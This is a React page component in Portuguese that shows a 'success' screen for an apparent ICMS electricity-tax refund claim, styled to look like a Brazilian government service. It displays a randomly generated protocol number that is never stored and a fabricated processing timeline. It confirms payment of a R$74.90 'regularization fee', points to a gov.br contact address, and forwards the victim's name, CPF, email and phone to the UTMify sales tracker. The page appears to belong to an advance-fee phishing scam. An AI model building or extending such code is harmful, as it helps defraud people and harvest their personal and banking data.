import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { CheckCircle2, Home, Download, FileText, Copy, Check, CalendarClock, DollarSign, Database, CircleUser } from "lucide-react";
import { Link, useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Separator } from "@/components/ui/separator";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { sendPaymentConfirmedNotification } from "@/lib/utmify";

const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

const formatarTelefone = (telefone: string) => {
  // Remove todos os caracteres não numéricos
  const apenasNumeros = telefone.replace(/\D/g, '');
  
  // Verifica se é celular (com 9 na frente) ou telefone fixo
  if (apenasNumeros.length === 11) {
    return apenasNumeros.replace(/(\d{2})(\d{1})(\d{4})(\d{4})/, "($1) $2 $3-$4");
  } else if (apenasNumeros.length === 10) {
    return apenasNumeros.replace(/(\d{2})(\d{4})(\d{4})/, "($1) $2-$3");
  }
  
  // Retorna como está se não for possível formatar
  return telefone;
};

export default function Sucesso() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [dataEstimada, setDataEstimada] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  const [dadosSolicitacao, setDadosSolicitacao] = useState({
    nome: "",
    cpf: "",
    email: "",
    telefone: "",
    valor: "0",
    companhia: "",
    estado: "",
    dataNascimento: "",
    banco: "",
    bancoNome: "",
    agencia: "",
    conta: "",
    pagamentoId: ""
  });
  const [copiado, setCopiado] = useState(false);

  // Função para copiar o protocolo
  const copiarProtocolo = () => {
    navigator.clipboard.writeText(protocolo).then(() => {
      setCopiado(true);
      toast({
        title: "Protocolo copiado!",
        description: "O número do protocolo foi copiado para a área de transferência."
      });
      setTimeout(() => setCopiado(false), 2000);
    });
  };

  useEffect(() => {
    // Recuperar dados da URL
    const params = new URLSearchParams(window.location.search);
    
    // Verificar se temos os parâmetros necessários
    if (!params.get('cpf') || !params.get('nome') || !params.get('valor')) {
      // Redirecionar para a página inicial se não tivermos os dados necessários
      setLocation("/");
      return;
    }
    
    // Gerar protocolo aleatório
    const gerarProtocolo = () => {
      const letras = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
      const numeros = "0123456789";
      let resultado = "";
      
      // Formato: 2 letras + 6 números + 2 letras
      for (let i = 0; i < 2; i++) {
        resultado += letras.charAt(Math.floor(Math.random() * letras.length));
      }
      
      for (let i = 0; i < 6; i++) {
        resultado += numeros.charAt(Math.floor(Math.random() * numeros.length));
      }
      
      for (let i = 0; i < 2; i++) {
        resultado += letras.charAt(Math.floor(Math.random() * letras.length));
      }
      
      return resultado;
    };

    // Gerar data estimada (até 3 dias úteis para avaliação + até 30 dias úteis para pagamento)
    const gerarDataEstimada = () => {
      // Garantir que temos uma data válida
      let dataPagamento: Date;
      
      try {
        const dataPagamentoStr = params.get('dataPagamento');
        dataPagamento = dataPagamentoStr ? new Date(dataPagamentoStr) : new Date();
      } catch (error) {
        // Fallback para data atual em caso de erro de parsing
        dataPagamento = new Date();
      }
      
      // Adicionar 72 horas (3 dias) à data de pagamento
      const dataLimite = new Date(dataPagamento.getTime());
      dataLimite.setHours(dataLimite.getHours() + 72);
      
      return dataLimite.toLocaleDateString("pt-BR", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
      });
    };

    // Formatar data de pagamento
    const formatarDataPagamento = () => {
      const dataString = params.get('dataPagamento');
      if (!dataString) return new Date().toLocaleDateString("pt-BR");
      
      try {
        const data = new Date(dataString);
        return data.toLocaleDateString("pt-BR", {
          day: "2-digit",
          month: "2-digit",
          year: "numeric"
        });
      } catch (e) {
        return new Date().toLocaleDateString("pt-BR");
      }
    };

    // Organizar todos os dados da solicitação
    const dadosCompletos = {
      nome: params.get('nome') || "",
      cpf: params.get('cpf') || "",
      email: params.get('email') || "",
      telefone: params.get('telefone') || "",
      valor: params.get('valor') || "0",
      companhia: params.get('companhia') || "CEMIG Distribuição",
      estado: params.get('estado') || "Minas Gerais",
      dataNascimento: params.get('nasc') || "21/07/2003",
      banco: params.get('banco') || "bb",
      bancoNome: params.get('bancoNome') || "Banco do Brasil",
      agencia: params.get('agencia') || "",
      conta: params.get('conta') || "",
      pagamentoId: params.get('pagamentoId') || ""
    };

    // Atualizar estados
    setProtocolo(gerarProtocolo());
    setDataEstimada(gerarDataEstimada());
    setDataPagamento(formatarDataPagamento());
    setDadosSolicitacao(dadosCompletos);
    
    // Enviar notificação para UTMify sobre o pagamento confirmado
    // Só enviamos se tivermos um ID de pagamento válido
    if (dadosCompletos.pagamentoId) {
      try {
        const valorEmCentavos = 7490; // R$ 74,90 em centavos
        
        sendPaymentConfirmedNotification(
          dadosCompletos.pagamentoId,
          {
            name: dadosCompletos.nome,
            email: dadosCompletos.email,
            phone: dadosCompletos.telefone,
            document: dadosCompletos.cpf
          },
          valorEmCentavos
        );
        
        console.log("Notificação de pagamento confirmado enviada com sucesso para UTMify pela página de sucesso");
      } catch (error) {
        console.error("Erro ao enviar notificação para UTMify pela página de sucesso:", error);
      }
    }
  }, [setLocation]);

  // Função para imprimir comprovante
  const imprimirComprovante = () => {
    window.print();
  };

  return (
    <>
      <Header />
      <main className="bg-[var(--gov-gray-light)] min-h-screen py-10">
        <div className="container max-w-4xl mx-auto px-4">
          <div className="bg-white p-6 rounded-lg shadow-md">
            <div className="flex flex-col items-center justify-center text-center space-y-4 mb-8">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                <CheckCircle2 className="w-10 h-10 text-green-600" />
              </div>
              <h1 className="text-2xl md:text-3xl font-bold text-[var(--gov-blue-dark)]">
                Solicitação Concluída com Sucesso!
              </h1>
              <p className="text-[var(--gov-gray-dark)] max-w-xl">
                <span className="font-medium">{dadosSolicitacao.nome.split(" ")[0]}</span>, sua solicitação de restituição foi registrada e confirmada. 
                Agora sua solicitação entrará na fase de análise documental para liberação do pagamento.
              </p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
              <Card className="border-green-200 shadow-sm h-full">
                <CardHeader className="bg-green-50 border-b border-green-200">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-green-800 flex items-center gap-2">
                      <Database className="h-5 w-5" /> Dados da Solicitação
                    </CardTitle>
                    <Badge variant="outline" className="bg-green-100 text-green-800 border-green-300">
                      CONFIRMADO
                    </Badge>
                  </div>
                </CardHeader>
                <CardContent className="space-y-4 pt-6">
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Número do Protocolo:</span>
                    <div className="flex items-center gap-2">
                      <span className="font-semibold text-[var(--gov-blue-dark)]">{protocolo}</span>
                      <Button 
                        variant="ghost" 
                        size="icon" 
                        className="h-6 w-6" 
                        onClick={copiarProtocolo}
                      >
                        {copiado ? (
                          <Check className="h-4 w-4 text-green-600" />
                        ) : (
                          <Copy className="h-4 w-4 text-gray-500" />
                        )}
                      </Button>
                    </div>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Status:</span>
                    <span className="text-sm bg-blue-100 text-blue-800 px-3 py-1 rounded-full font-medium">
                      Em análise
                    </span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Data da TRE:</span>
                    <span className="text-[var(--gov-gray-dark)]">
                      {dataPagamento}
                    </span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Valor da Restituição:</span>
                    <span className="text-green-600 font-semibold">{formatarMoeda(dadosSolicitacao.valor)}</span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Companhia:</span>
                    <span className="text-[var(--gov-gray-dark)]">{dadosSolicitacao.companhia}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Previsão de Pagamento:</span>
                    <span className="text-[var(--gov-gray-dark)]">Até {dataEstimada}</span>
                  </div>
                </CardContent>
              </Card>

              <Card className="border-blue-200 shadow-sm h-full">
                <CardHeader className="bg-blue-50 border-b border-blue-200">
                  <CardTitle className="text-blue-800 flex items-center gap-2">
                    <CircleUser className="h-5 w-5" /> Dados Pessoais
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4 pt-6">
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Nome Completo:</span>
                    <span className="text-[var(--gov-gray-dark)] font-medium">{dadosSolicitacao.nome}</span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">CPF:</span>
                    <span className="text-[var(--gov-gray-dark)] font-medium">{formatarCPF(dadosSolicitacao.cpf)}</span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Data de Nascimento:</span>
                    <span className="text-[var(--gov-gray-dark)]">{dadosSolicitacao.dataNascimento}</span>
                  </div>

                  <div className="flex justify-between items-center">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Estado:</span>
                    <span className="text-[var(--gov-gray-dark)]">{dadosSolicitacao.estado}</span>
                  </div>
                </CardContent>
              </Card>
            </div>

            <Card className="shadow-sm mb-8">
              <CardContent className="pt-6">
                <div className="w-full flex flex-col sm:flex-row gap-3 justify-between">
                  <Button variant="outline" className="gap-2" onClick={imprimirComprovante}>
                    <Download className="h-4 w-4" />
                    Salvar Comprovante
                  </Button>
                  <Button variant="outline" className="gap-2" onClick={() => window.open(`mailto:contato@restituicao-icms.gov.br?subject=Consulta%20Protocolo%20${protocolo}`)}>
                    <FileText className="h-4 w-4" />
                    Acompanhar Solicitação
                  </Button>
                </div>
              </CardContent>
            </Card>

            <Card className="mb-8">
              <CardHeader className="bg-blue-50 border-b border-blue-200">
                <CardTitle className="text-blue-800 flex items-center gap-2">
                  <CalendarClock className="h-5 w-5" /> Cronograma de Processamento
                </CardTitle>
              </CardHeader>
              <CardContent className="pt-6">
                <div className="space-y-8">
                  <div className="flex">
                    <div className="flex flex-col items-center mr-4">
                      <div className="rounded-full h-8 w-8 bg-green-500 text-white flex items-center justify-center">1</div>
                      <div className="h-full w-0.5 bg-gray-200 mt-2"></div>
                    </div>
                    <div className="pb-6">
                      <h3 className="text-lg font-medium text-green-700">Pagamento da TRE</h3>
                      <p className="text-gray-600">Concluído em {dataPagamento}</p>
                      <p className="mt-1 text-sm text-gray-500">
                        Taxa de Regularização Energética (TRE) confirmada e processada.
                      </p>
                    </div>
                  </div>
                  
                  <div className="flex">
                    <div className="flex flex-col items-center mr-4">
                      <div className="rounded-full h-8 w-8 bg-blue-500 text-white flex items-center justify-center">2</div>
                      <div className="h-full w-0.5 bg-gray-200 mt-2"></div>
                    </div>
                    <div className="pb-6">
                      <h3 className="text-lg font-medium text-[var(--gov-blue-dark)]">Análise Documental</h3>
                      <p className="text-blue-600 font-medium">Em andamento</p>
                      <p className="mt-1 text-sm text-gray-500">
                        Seus documentos estão sendo analisados para confirmação dos dados de conta e valor.
                        <span className="block mt-1">Tempo estimado: até 3 dias úteis</span>
                      </p>
                    </div>
                  </div>
                  
                  <div className="flex">
                    <div className="flex flex-col items-center mr-4">
                      <div className="rounded-full h-8 w-8 bg-gray-300 text-white flex items-center justify-center">3</div>
                      <div className="h-full w-0.5 bg-gray-200 mt-2"></div>
                    </div>
                    <div className="pb-6">
                      <h3 className="text-lg font-medium text-gray-500">Processamento Bancário</h3>
                      <p className="text-gray-400">Aguardando análise documental</p>
                      <p className="mt-1 text-sm text-gray-500">
                        Preparação para envio dos dados bancários para processamento da restituição.
                        <span className="block mt-1">Tempo estimado: até 7 dias úteis</span>
                      </p>
                    </div>
                  </div>
                  
                  <div className="flex">
                    <div className="flex flex-col items-center mr-4">
                      <div className="rounded-full h-8 w-8 bg-gray-300 text-white flex items-center justify-center">4</div>
                    </div>
                    <div>
                      <h3 className="text-lg font-medium text-gray-500">Pagamento</h3>
                      <p className="text-gray-400">Aguardando etapas anteriores</p>
                      <p className="mt-1 text-sm text-gray-500">
                        Transferência do valor de {formatarMoeda(dadosSolicitacao.valor)} para sua conta bancária.
                        <span className="block mt-1">Previsão: até {dataEstimada}</span>
                      </p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <div className="space-y-6">
              <div className="p-6 bg-blue-50 rounded-lg border border-blue-200">
                <h2 className="font-semibold text-lg text-blue-800 mb-3">Informações Importantes</h2>
                <div className="space-y-3 text-blue-700">
                  <p>
                    <span className="font-medium">• Acompanhamento:</span> Você receberá atualizações por e-mail sobre o status da sua solicitação.
                  </p>
                  <p>
                    <span className="font-medium">• Documentação:</span> Caso seja necessário enviar documentos adicionais, entraremos em contato.
                  </p>
                  <p>
                    <span className="font-medium">• Prazo:</span> O tempo total estimado para conclusão do processo é de até 30 dias úteis.
                  </p>
                  <p>
                    <span className="font-medium">• Suporte:</span> Para dúvidas ou informações, utilize o protocolo {protocolo} como referência.
                  </p>
                </div>
              </div>
              
              <Separator />
              
              <div className="flex justify-center mt-6">
                <Link href="/">
                  <Button className="bg-[var(--gov-blue)]">
                    <Home className="mr-2 h-4 w-4" />
                    Voltar para a página inicial
                  </Button>
                </Link>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}